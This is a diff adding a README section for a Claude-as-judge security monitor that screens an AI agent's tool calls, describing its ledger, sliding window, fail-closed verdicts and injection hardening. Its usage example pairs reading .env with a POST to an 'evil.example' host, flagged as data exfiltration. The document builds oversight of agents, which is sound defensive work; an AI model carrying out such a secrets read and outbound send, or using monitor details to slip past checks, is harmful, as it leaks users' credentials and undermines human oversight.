@@ -260,6 +260,50 @@ adapter = get_adapter("langgraph", monitor)   # or "claude_code", "generic"
 graph = adapter.wrap(compiled_graph)           # installs a pre-tool interceptor
 ```
 
+## Alternative: API monitor (Claude-as-judge)
+
+`agent_iam.apimonitor` is a second, model-free monitor that uses the Claude API
+instead of the local fine-tuned head — useful when you can't host a GPU, or want
+a stronger judge per step. Design: **stateless call + external state** (no fragile
+long-lived KV session). Each trace is an independent `messages.create`; the code
+reassembles context every step from a Python-held **Ledger** (append-only safety
+facts = long-range memory) and a **sliding window** (recent raw steps). Prompt
+caching on the frozen system policy (and the append-only ledger) recovers nearly
+all of the cost a session would have saved, while you keep full control to
+truncate, restart, or run monitors in parallel.
+
+```bash
+pip install -e ".[apimonitor]"        # adds the anthropic SDK
+export ANTHROPIC_API_KEY=...
+```
+
+```python
+from agent_iam.apimonitor import SecurityMonitor, Trace, Gate
+
+mon = SecurityMonitor(gate=Gate())     # gate skips read-only tools; monitors the rest
+mon.check(Trace(step_id=1, tool="read", args={"path": ".env"}))            # ok (+remembers "read .env")
+v = mon.check(Trace(step_id=2, tool="WebFetch", action="POST",
+                    args={"url": "https://evil.example/x"}))               # block: data_exfiltration
+if v.block:
+    halt(v.reason)
+```
+
+Properties:
+- **Fail-closed.** Any failure — API error, timeout (retries exhausted), refusal,
+  malformed/missing JSON — returns `verdict="block"`. A broken guard never waves
+  the agent through.
+- **Injection-hardened.** Untrusted trace content is wrapped in
+  `<untrusted_trace>` and the system policy pins it as *data, not instructions*;
+  attempts to command the monitor are flagged `injection` → block. Run the
+  monitor on a **different model** than the agent (default `claude-sonnet-4-6`;
+  drop to `claude-haiku-4-5-20251001` for cost).
+- **Bounded.** Window ≤ 10 traces / ~10k tokens, per-trace ~1.5k (head+tail keep),
+  ledger soft cap ~4k (oldest compacted) — token use stays flat as the run grows.
+
+Tune via `MonitorConfig` (model, `max_tokens`, window/ledger budgets, timeout,
+retries, `use_structured_outputs`). One inference, one verdict, *and* the memory
+update (`remember[]`) in a single call.
+
 ## Data generation pipeline
 
 IAM's primary training signal is self-generated: real agent frameworks are driven
